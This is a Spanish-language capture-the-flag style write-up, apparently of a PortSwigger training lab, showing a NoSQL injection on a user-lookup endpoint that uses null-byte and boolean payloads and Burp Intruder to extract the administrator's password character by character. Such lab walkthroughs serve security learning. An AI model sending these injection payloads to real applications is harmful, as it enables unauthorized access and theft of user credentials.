Tenemos el siguiente laboratorio:
![[Pasted image 20240314131909.png]]
Nos autenticamos dentro del laboratorio:
```bash
wiener:peter
```
![[Pasted image 20240325140236.png]]
Y este es el correo asignado:
![[Pasted image 20240325140304.png]]
Si colamos una comilla, veremos que nos da un error:
![[Pasted image 20240325140339.png]]
Ahora en burp suite vamos a ir a la parte de HTTP history donde veremos la petición de login:
![[Pasted image 20240325141409.png]]
Pulsando control + R mandamos esta petición al repeater para ir haciendo más pruebas:
![[Pasted image 20240325141417.png]]
Si enviamos esta petición obtenemos los detalles del usuario wiener:
![[Pasted image 20240325141502.png]]
Pero si colamos una comilla justo después del usuario wiener vemos que se bloquea el programa:
![[Pasted image 20240325141530.png]]
Ahora si inyectamos lo siguiente veremos que vuelve a funcionar y obtenemos los detalles del usuario:
```bash
GET /user/lookup?user=wiener'%00
```
![[Pasted image 20240325141656.png]]
Ahora podemos inyectar la siguiente instrucción:
```bash
GET /user/lookup?user=wiener'&&'1'=='1'%00
```
Pero el && tenemos que url encodearlo seleccionándolo y presionando control + U; y vemos que vuelve a funcionar:
![[Pasted image 20240325141904.png]]
Probamos la inyección y ahora si ponemos 1=2 vemos que no va a funcionar:
```bash
GET /user/lookup?user=wiener'%26%26'1'=='2'%00
```
![[Pasted image 20240325141947.png]]
Viendo esta inyección, podemos ahora obtener las credenciales del usuario administrador con el siguiente payload:
```bash
GET /user/lookup?user=administrator'%26%26this.password%00 HTTP/2
```
![[Pasted image 20240325142124.png]]
Entonces ahora podríamos intentar descubrir primero cual es la longitud de la contraseña del usuario administrador, probando si tiene longitud de 1,2,3 o los caracteres que sean:
```bash
GET /user/lookup?user=administrator'%26%26this.password.length==1%00 
```
Por ejemplo si probamos con la longitud de 1, no encuentra:
![[Pasted image 20240325142617.png]]
Podemos hacer un ataque con el intruder probando distintos números:
![[Pasted image 20240325142646.png]]
Ponemos que haga un ataque secuencial de 1 caracter a 50:
![[Pasted image 20240325142732.png]]
Nos fijamos en la longitud de respuesta y vemos que la contraseña tiene 8 caracteres:
![[Pasted image 20240325142816.png]]
Comprobamos ahora que al poner 8 caracteres funciona bien:
```bash
GET /user/lookup?user=administrator'%26%26this.password.length==8%00
```
![[Pasted image 20240325142857.png]]
Entonces ahora vamos a extraer la contraseña fuzzeando letra por letra, mandando la siguiente petición al intruder:
```bash
GET /user/lookup?user=administrator'%26%26this.password[0]=='a
```
![[Pasted image 20240325143248.png]]
Y en la parte de payloads ponemos todo el abecedario:
![[Pasted image 20240325143358.png]]
Hacemos el ataque y vemos que el primer caracter es la letra o:
![[Pasted image 20240325151217.png]]
Ahora hacemos lo mismo pero para adivinar la posición 1:
![[Pasted image 20240325151251.png]]
Vemos la letra g:
![[Pasted image 20240325151312.png]]
Y así sucesivamente con todas las posiciones hasta llegar a la 8, donde obtenemos la siguiente contraseña:
```bash
oguhxnfl
```
Nos logueamos como el usuario administrador utilizando esta contraseña y funciona:
![[Pasted image 20240325151635.png]]
![[Pasted image 20240325151641.png]]


